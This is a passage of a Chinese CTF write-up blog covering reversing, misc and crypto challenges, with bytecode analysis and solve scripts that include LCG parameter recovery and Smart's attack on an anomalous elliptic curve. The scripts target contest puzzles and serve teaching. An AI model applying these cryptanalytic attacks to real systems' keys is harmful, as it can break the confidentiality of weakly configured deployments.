PRECALL                  1</span><br><span class="line">            458 CALL                     1</span><br><span class="line">            468 GET_ITER</span><br><span class="line">        &gt;&gt;  470 FOR_ITER                38 (to 548)</span><br><span class="line">            472 STORE_NAME               5 (i)</span><br><span class="line"></span><br><span class="line"> 34         474 LOAD_NAME                2 (value)</span><br><span class="line">            476 LOAD_NAME                5 (i)</span><br><span class="line">            478 BINARY_SUBSCR</span><br><span class="line">            488 STORE_NAME              11 (temp)</span><br><span class="line"></span><br><span class="line"> 35         490 PUSH_NULL</span><br><span class="line">            492 LOAD_NAME               12 (chr)</span><br><span class="line">            494 PUSH_NULL</span><br><span class="line">            496 LOAD_NAME               13 (ord)</span><br><span class="line">            498 LOAD_NAME               11 (temp)</span><br><span class="line">            500 PRECALL                  1</span><br><span class="line">            504 CALL                     1</span><br><span class="line">            514 LOAD_CONST               6 (3)</span><br><span class="line">            516 BINARY_OP                0 (+)</span><br><span class="line">            520 PRECALL                  1</span><br><span class="line">            524 CALL                     1</span><br><span class="line">            534 STORE_NAME              11 (temp)</span><br><span class="line"></span><br><span class="line"> 36         536 LOAD_NAME                3 (output)</span><br><span class="line">            538 LOAD_NAME               11 (temp)</span><br><span class="line">            540 BINARY_OP               13 (+=)</span><br><span class="line">            544 STORE_NAME               3 (output)</span><br><span class="line">            546 JUMP_BACKWARD           39 (to 470)</span><br><span class="line"></span><br><span class="line"> 37     &gt;&gt;  548 PUSH_NULL</span><br><span class="line">            550 LOAD_NAME                0 (base64)</span><br><span class="line">            552 LOAD_ATTR               14 (b64encode)</span><br><span class="line">            562 LOAD_NAME                3 (output)</span><br><span class="line">            564 LOAD_METHOD             15 (encode)</span><br><span class="line">            586 PRECALL                  0</span><br><span class="line">            590 CALL                     0</span><br><span class="line">            600 PRECALL                  1</span><br><span class="line">            604 CALL                     1</span><br><span class="line">            614 LOAD_METHOD             16 (decode)</span><br><span class="line">            636 PRECALL                  0</span><br><span class="line">            640 CALL                     0</span><br><span class="line">            650 STORE_NAME              17 (obfuscated_output)</span><br><span class="line"></span><br><span class="line"> 38         652 LOAD_NAME               17 (obfuscated_output)</span><br><span class="line">            654 LOAD_CONST               1 (None)</span><br><span class="line">            656 LOAD_CONST               1 (None)</span><br><span class="line">            658 LOAD_CONST              12 (-1)</span><br><span class="line">            660 BUILD_SLICE              3</span><br><span class="line">            662 BINARY_SUBSCR</span><br><span class="line">            672 STORE_NAME              17 (obfuscated_output)</span><br><span class="line"></span><br><span class="line"> 39         674 LOAD_NAME               17 (obfuscated_output)</span><br><span class="line">            676 LOAD_METHOD             18 (replace)</span><br><span class="line">            698 LOAD_CONST              13 (&#x27;0&#x27;)</span><br><span class="line">            700 LOAD_CONST              14 (&#x27;t&#x27;)</span><br><span class="line">            702 PRECALL                  2</span><br><span class="line">            706 CALL                     2</span><br><span class="line">            716 STORE_NAME              17 (obfuscated_output)</span><br><span class="line"></span><br><span class="line"> 40         718 LOAD_NAME               17 (obfuscated_output)</span><br><span class="line">            720 LOAD_METHOD             18 (replace)</span><br><span class="line">            742 LOAD_CONST              15 (&#x27;c&#x27;)</span><br><span class="line">            744 LOAD_CONST              16 (&#x27;4&#x27;)</span><br><span class="line">            746 PRECALL                  2</span><br><span class="line">            750 CALL                     2</span><br><span class="line">            760 STORE_NAME              17 (obfuscated_output)</span><br><span class="line"></span><br><span class="line"> 41         762 LOAD_NAME               17 (obfuscated_output)</span><br><span class="line">            764 LOAD_METHOD             18 (replace)</span><br><span class="line">            786 LOAD_CONST              17 (&#x27;+&#x27;)</span><br><span class="line">            788 LOAD_CONST              18 (&#x27;-&#x27;)</span><br><span class="line">            790 PRECALL                  2</span><br><span class="line">            794 CALL                     2</span><br><span class="line">            804 STORE_NAME              17 (obfuscated_output)</span><br><span class="line"></span><br><span class="line"> 42         806 PUSH_NULL</span><br><span class="line">            808 LOAD_NAME               19 (print)</span><br><span class="line">            810 LOAD_NAME               17 (obfuscated_output)</span><br><span class="line">            812 PRECALL                  1</span><br><span class="line">            816 CALL                     1</span><br><span class="line">            826 POP_TOP</span><br><span class="line">            828 LOAD_CONST               1 (None)</span><br><span class="line">            830 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">==AeAF3M-tzO-giQ-AUQosDQ9tGK7MDPuhC47tDNB5Tb8Yn4sdW4</span><br></pre></td></tr></table></figure>

<p>利用一下GPT，再结合代码，可以知道，上述这段代码等同于👇</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;xxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    temp = <span class="built_in">ord</span>(flag[i])</span><br><span class="line">    temp ^= <span class="number">8</span></span><br><span class="line">    value += <span class="built_in">chr</span>(temp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(value)):</span><br><span class="line">    temp = <span class="built_in">ord</span>(value[i])</span><br><span class="line">    temp += <span class="number">3</span></span><br><span class="line">    output += <span class="built_in">chr</span>(temp)</span><br><span class="line">    </span><br><span class="line">obfuscated_output = base64.b64encode(output.encode()).decode()</span><br><span class="line">obfuscated_output = obfuscated_output[::-<span class="number">1</span>]</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(obfuscated_output)</span><br></pre></td></tr></table></figure>

<p>根据该代码，逆向回去即可</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;==AeAF3M-tzO-giQ-AUQosDQ9tGK7MDPuhC47tDNB5Tb8Yn4sdW4&quot;</span></span><br><span class="line">s = s.replace(<span class="string">&quot;t&quot;</span>,<span class="string">&#x27;0&#x27;</span>).replace(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;c&quot;</span>).replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;+&quot;</span>)</span><br><span class="line">c = base64.b64decode(s[::-<span class="number">1</span>])</span><br><span class="line">m = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    mm = (i - <span class="number">3</span>) ^ <span class="number">8</span></span><br><span class="line">    m += (<span class="built_in">chr</span>(mm))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#flag&#123;1b36920e-c180-b250-6537-30238f5&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="远在天边近在眼前"><a href="#远在天边近在眼前" class="headerlink" title="远在天边近在眼前"></a>远在天边近在眼前</h3><p>发现压缩包里每个文件夹的名字就是flag的字符</p>
<p>让GPT写个脚本</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_folder_names</span>(<span class="params">zip_file_path</span>):</span><br><span class="line">    folder_names = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_file:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> zip_file.infolist():</span><br><span class="line">            <span class="keyword">if</span> item.is_dir():</span><br><span class="line">                folder_name = item.filename.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(folder_name[::-<span class="number">1</span>])</span><br><span class="line">                folder_names.append(folder_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> folder_names</span><br><span class="line"></span><br><span class="line">zip_file_path = <span class="string">&#x27;find_me.zip&#x27;</span></span><br><span class="line">folders = get_folder_names(zip_file_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;Th15_lS_r3a1lY_e4Sy_4IR16h7?_ded16ee11e6a&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="可爱的洛琪希"><a href="#可爱的洛琪希" class="headerlink" title="可爱的洛琪希"></a>可爱的洛琪希</h3><p>把文本的数据丢cyberchef，转为了图片</p>
<p><img src="/../../images/2023SHCTF/download.png"></p>
<p>010打开，末尾有个<code>key = nanian</code></p>
<p>疑惑密文在哪，然后把图片丢<a target="_blank" rel="noopener" href="https://exif.tuchong.com/view/13732165/">活动 - 图虫网 - 优质摄影师交流社区 (tuchong.com)</a>查看信息</p>
<p>得到<code>736c6e6f7b52626b795f71696966686b76217d</code>，16进制转字符得到<code>slno&#123;Rbky_qiifhkv!&#125;</code></p>
<p>再结合<code>key</code>，维吉尼亚解密得到flag:<code>flag&#123;Roxy_daisuki!&#125;</code></p>
<h1 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h1><h2 id="Crypto-2"><a href="#Crypto-2" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="撤退"><a href="#撤退" class="headerlink" title="撤退"></a>撤退</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = *******</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">hb = <span class="built_in">len</span>(flag)//<span class="number">2</span></span><br><span class="line">hb1 = bytes_to_long(flag[:hb])</span><br><span class="line">hb2 = bytes_to_long(flag[hb:])</span><br><span class="line">D = <span class="number">117</span></span><br><span class="line">x = *******</span><br><span class="line">y = *******</span><br><span class="line"><span class="keyword">assert</span> x**<span class="number">2</span> - D * y**<span class="number">2</span> == <span class="number">1</span></span><br><span class="line">enc1 = <span class="built_in">pow</span>(<span class="number">334</span> * n ** <span class="number">2</span> + <span class="number">1</span>, hb1, n ** <span class="number">3</span>)</span><br><span class="line">enc2 = <span class="built_in">pow</span>(y * n + <span class="number">1</span>, hb2, n ** <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(enc1)</span><br><span class="line"><span class="built_in">print</span>(enc2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">22970461944771505344360312103272646796516672838005008112295760406393062653512719537671401409823031480497512491850701737384621917068068328814717390355072928714618936469722031401433712342846780800586803218279291870162605299119904016959036663767093191710796830156169925350938267584422752300171293262391805105435418210827517225439398971437884496416502510866914857269951072184669675339439115587325754431761172634305242650221404868035624879538862880516438147301289746375407945908866907822940285764276956194031840381838253923392794376568293056359058519233175242523219646628321609305890926063856400793680641992567798104042179</span></span><br><span class="line"><span class="string">26380574883568223071748995929433720836641856899148821439556557592284999544802260386919172895274884666117488851000353221957579311943624258651646692068406462392980585841604755021251430357273933800209194484692955106014890051223465745443628784077844452303995642424661442978294757109040081050794398646640530714904683097650259060507908334791761124660725589404056356987726993518057050112725483482660202442987346646160168856264312557595890710521723067518303906942469282527855551751244126251698491010628369012024332666619702895796133780038584346428759785302542637171018926824843416176876077558936427399803328577151066597396550597352625005028261156114571696860700477410270949916316951150072218466374341394892405947793726872954497972795793421222424616005278493704125169150432275472846871295341469911428057621028515874978272004775903906188556908968810828510069826724631700523623584802605889173266453916347583720706846630531082266742377818663000322817114065116737931523412220137972079139507877669106470150742546914051556747087768279286696519700220233815812834114117581332234344024169109786527295900675653245014343393093832478814567179131966404207553408747774003319241150221488231674711614902743345516888975702483348011349617017294004761259419165663633915672647187482242462163420462987034240805524991</span></span><br><span class="line"><span class="string">21190674872507845600786632640969893237129139877891071648594239906632201421611954626926407751780936578853046780585253060958265549804784845192757301417173404074965693840282568701968464564320290763073618132775799910356101999797720378313304899173154753858674284071499775857913937184713024788245068426198878834805943703426673512761178072458895973672088230653246356764681418231485563287856188079274727706554037799748595877069143254516390328019381867648697880975670688337068196993846986940286056873616919629721264139576692806770826129279380704466982862393203486037890448173834315360975464927583664991534571518159777852793416869350127023692816051992183670690315184731534611966603509867722931839839084915943647295195314171688904055674915382434841320612108023531722571519492067471405656160804893645713608592561788743509876384862097871840094582513721456962354498561006793609200187065931433827465455037397503619844768415369973322759940610358415184510344945559838007474725413347675347453443583610217539704055467297318282309867987435252614428856515259899385689971172417660178761139941056839133998928898528744331662995956041897599276732929020537698559927654297185422925737241274711904687894411308774527520523946951208805307060323875839353707549772052299847176824964552693112658495961070555882583739017417359463576705453026824255338859618053086622031941</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>解佩尔方程$x^2-Dy^2 &#x3D; 1$得到$x,y$</p>
<p>$\because enc_1 \equiv (334n^2 + 1)^m \mod n^3$</p>
<p>展开得到$enc_1 &#x3D; C_m^{m-1}\times 334n^2 + 1$即$enc_1 &#x3D; 334m\times n^2 + 1$，解方程即可得到$m_1$</p>
<p>$\because enc_2 \equiv (yn + 1)^m \mod n^3$</p>
<p>展开得到$enc_2 \equiv 1^m + m\times yn + \frac{m(m-1)}{2}\times y^2n^2 +…+(yn)^m\mod n^3$</p>
<p>即$enc_2 \equiv 1 + m\times yn + \frac{m(m-1)}{2}\times y^2n^2 \mod n^3$</p>
<p>$enc_2 - 1 &#x3D; m\times yn + \frac{m(m-1)}{2}\times y^2n^2$</p>
<p>同除$n$得到$\frac{enc_2-1}{n} &#x3D; m\times y +\frac{m(m-1)}{2}y^2n$，解这个方程即可得到$m_2$</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line">n = </span><br><span class="line">enc1 = </span><br><span class="line">enc2 = </span><br><span class="line"></span><br><span class="line">numTry = <span class="number">1500</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry</span>):</span><br><span class="line">    cf = continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span> - N * denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer, denom</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">x,y = solve_pell(N,numTry)</span><br><span class="line"><span class="comment"># print(x,y)</span></span><br><span class="line"><span class="comment"># x = 649</span></span><br><span class="line"><span class="comment"># y = 60</span></span><br><span class="line"></span><br><span class="line">var(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">f = <span class="number">334</span>*m*n^<span class="number">2</span> + <span class="number">1</span> == enc1</span><br><span class="line">ans = solve(f,m)</span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line">m1 = <span class="number">149691910197777805350862530703771372803641869951585</span></span><br><span class="line">flag1 = long_to_bytes(<span class="built_in">int</span>(m1))</span><br><span class="line"></span><br><span class="line">c1 = (enc2-<span class="number">1</span>) // n</span><br><span class="line">var(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">f = m*y + (m*(m-<span class="number">1</span>)/<span class="number">2</span>) * y^<span class="number">2</span>*n - c1 </span><br><span class="line">ans = solve(f,m)</span><br><span class="line"><span class="comment"># print(ans)</span></span><br><span class="line"></span><br><span class="line">m2 = <span class="number">149371042625025154522769720206540986718252215526781</span></span><br><span class="line">flag2 = long_to_bytes(<span class="built_in">int</span>(m2))</span><br><span class="line"><span class="built_in">print</span>(flag1+flag2)</span><br><span class="line"><span class="comment">#flag&#123;6c6eb27a-061b-baf4-4cae26-5a609588ce&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long ,getPrime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag , p, A, B</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, multiplier, increment, modulus</span>):</span><br><span class="line">        self.state = seed</span><br><span class="line">        self.multiplier = multiplier</span><br><span class="line">        self.increment = increment</span><br><span class="line">        self.modulus = modulus</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">round</span>(<span class="params">self</span>):</span><br><span class="line">        self.state = (self.state * self.multiplier + self.increment) % self.modulus</span><br><span class="line">        <span class="keyword">return</span> self.state</span><br><span class="line"></span><br><span class="line">LcG = LCG(p, A, B, getPrime(<span class="number">300</span>))</span><br><span class="line">hint = []</span><br><span class="line">rounds = randint(<span class="number">9</span>,<span class="number">999</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">    hint.append(LcG.<span class="built_in">round</span>())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;N =&#x27;</span>, LcG.modulus)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;hint =&#x27;</span>, hint[rounds-<span class="number">3</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rounds =&#x27;</span>,rounds)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">E = EllipticCurve(GF(p),[A,B])</span><br><span class="line">P = E.random_point() </span><br><span class="line">Q = m*P</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;P:&#x27;</span>,P)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;Q:&#x27;</span>,Q)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N = 1394352669118552710431836954956199165049966552966771775234358569430031450944715218123897207 </span></span><br><span class="line"><span class="comment"># hint = [1355490957378506208208697701592950672672094387068804168531572728350762596829890135826003351, 112984469981193183570958290700584499305718437364882160259618096856045410765383317657942333, 116900480821095370484396815088833958436491607704440051600260019545590977856114612401304297]</span></span><br><span class="line"><span class="comment"># rounds = 39</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># P:(25557735861606771704777704605284674181045459246221320438838413903928959660565 : 75510453815577804349033849040800841183099607056251418172827154938451453589656 : 1)</span></span><br><span class="line"><span class="comment"># Q:(56046292811652277371790197347740341815488809388747680953471201733291992185794 : 23661917912317435018072803232589214290695988219345248858537157579403272314 : 1)</span></span><br></pre></td></tr></table></figure>

<p>先解LCG得到椭圆曲线的参数，然后发现椭圆曲线的阶和$p$一样，运用SmartAttack即可</p>
<p>exp:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n =  </span><br><span class="line">output = </span><br><span class="line">rounds = <span class="number">39</span></span><br><span class="line"></span><br><span class="line">p1 = output[-<span class="number">1</span>] - output[-<span class="number">2</span>]</span><br><span class="line">p2 = output[-<span class="number">2</span>] - output[-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">Ani = gmpy2.invert(p2,n)</span><br><span class="line">a = p1 * Ani % n</span><br><span class="line"></span><br><span class="line">b = (output[-<span class="number">1</span>] - a*output[-<span class="number">2</span>]) % n</span><br><span class="line"></span><br><span class="line">ani = gmpy2.invert(a,n)</span><br><span class="line">seed = output[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">    seed = ani * (seed-b) % n</span><br><span class="line"></span><br><span class="line">p = seed</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>,a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;B =&quot;</span>,b)</span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line"><span class="built_in">print</span>(E.order())</span><br><span class="line"></span><br><span class="line">P = </span><br><span class="line">Q = </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"></span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"></span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"></span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"></span><br><span class="line">m = SmartAttack(P,Q,p)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># flag&#123;7H4T5_e4sye5T_ECc_o9b8E3&#125;</span></span><br></pre></td></tr></table></figure>



<h3 id="好好好！"><a href="#好好好！" class="headerlink" title="好好好！"></a>好好好！</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">***EGK*MAPZ**3TISLXYHW*B4*R*6CQV</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">dp=<span class="number">89183181604123417010894108474901628410408206538085478807758137668201829058797702838603939730356798163745078443656032825128645105954284119126609502005130005399692420386460970318283171848176434285488698019425286328269756591931253074416895028845240978211030365697435579850343911269163064228581083838914477473793</span></span><br><span class="line">n=<span class="number">17133884272385326910236146208723169235592379139078245324256146697759098524213354087333170410075813764497353656874360657828668202585141557095326829141561993608634568037533128091918704136052835609732443342167341276983343070200953604216445186924411131823487594273213380078485528148801722039459601896275130691200206027353715109606722659553700867073796386669768748305283547862565020499794358571741903375812063001390288166187510171105241363677243530996160649133253643422391688399573703498726489248479978887237752214015456924632092625018668632234215462091314384917176427670194819828555385014264912614752917792278216214856001</span></span><br><span class="line">c=<span 